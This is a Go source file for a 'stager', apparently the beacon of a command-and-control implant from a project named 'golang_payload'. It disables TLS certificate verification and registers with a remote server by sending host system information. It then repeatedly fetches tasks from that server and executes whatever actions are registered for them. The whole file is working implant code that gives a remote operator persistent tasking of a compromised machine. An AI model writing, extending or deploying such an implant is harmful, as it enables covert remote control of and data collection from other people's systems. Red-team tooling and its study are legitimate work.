package stager

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"golang_payload/actions"
	"golang_payload/comms"
	"golang_payload/types"
	"golang_payload/utils"
	"io"
	"net/http"
	"os"
	"strconv"
	"time"
)

type Stager struct {
	Id        string
	Name      string
	Uid       string
	SleepTime int
	Retries   int
	Delay     int
	Tasks     []types.Task
	Actions   map[string]func(types.Task)
}

func (s *Stager) RegisterAction(name string, action func(types.Task)) {
	s.Actions[name] = action
}

func (s *Stager) Setup(id string, uid string, sleepTime string, retries string, delay string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	s.Id = id
	s.Uid = uid
	s.SleepTime, _ = strconv.Atoi(sleepTime)
	s.Retries, _ = strconv.Atoi(retries)
	s.Delay, _ = strconv.Atoi(delay)
	s.Actions = make(map[string]func(types.Task))
}

func (s Stager) SetUrl(Address string, Port string, Ssl string) {
	var url string = ""

	if Ssl == "true" {
		url = "https://"
	} else {
		url = "http://"
	}

	url += Address + ":" + Port + "/"

	comms.SetUrl(url)
}

func (s Stager) SetUserAgent(userAgent string) {
	comms.SetUserAgent(userAgent)
}

func (s Stager) checkConection() {
	_, err := comms.GetRequest("")

	if err != nil {
		fmt.Println("C0nn3ct10n f41l3d.")
		for i := 0; i < s.Retries; i++ {
			fmt.Printf("R3trying (%d/%d)...\n", i+1, s.Retries)
			time.Sleep(time.Duration(s.SleepTime) * time.Second)
			_, err := comms.GetRequest("")
			if err == nil {
				break
			}
		}
	}

	if err != nil {
		fmt.Println("C0nn3ct10n f41l3d.")
		os.Exit(1)
	}
}
func (s *Stager) Register() {
	s.checkConection()
	data := actions.SystemInfo()
	data["uid"] = s.Uid
	data["stager"] = s.Id
	res, err := comms.PostRequest("connect", data)
	if err != nil {
		fmt.Println("Could not register with the server.")
	}

	var result map[string]interface{}
	json.NewDecoder(res.Body).Decode(&result)
	s.Name = result["name"].(string)
}

// Fetches the tasks from the server and stores them in the stager
func (s *Stager) fetchTasks() (err error) {
	// Get the tasks
	res, err := comms.GetRequest("tasks/" + s.Name)

	if err != nil {
		return
	}

	body, err := io.ReadAll(res.Body)
	defer res.Body.Close()

	if err != nil {
		return
	}

	err = json.Unmarshal(body, &s.Tasks)

	if err != nil {
		return
	}

	return
}

func (s *Stager) executeTasks() {
	for _, task := range s.Tasks {
		// Execute the task
		if s.Actions[task.Action] != nil {
			s.Actions[task.Action](task)
		} else {
			utils.Finish(task, "Action is not supported.", false)
		}
	}
}

func (s *Stager) Run() {
	// Sleep for the delay
	time.Sleep(time.Duration(s.Delay) * time.Second)
	// Register with the server
	s.Register()
	// Loop until the retries are reached
	for retry := 0; retry < s.Retries; retry++ {
		// fetch the tasks
		for {
			err := s.fetchTasks()
			if err != nil {
				fmt.Println("Could not fetch tasks.")
				break
			}
			s.executeTasks()
			time.Sleep(time.Duration(s.SleepTime) * time.Second)
		}
		time.Sleep(time.Duration(s.SleepTime) * time.Second)
	}
}
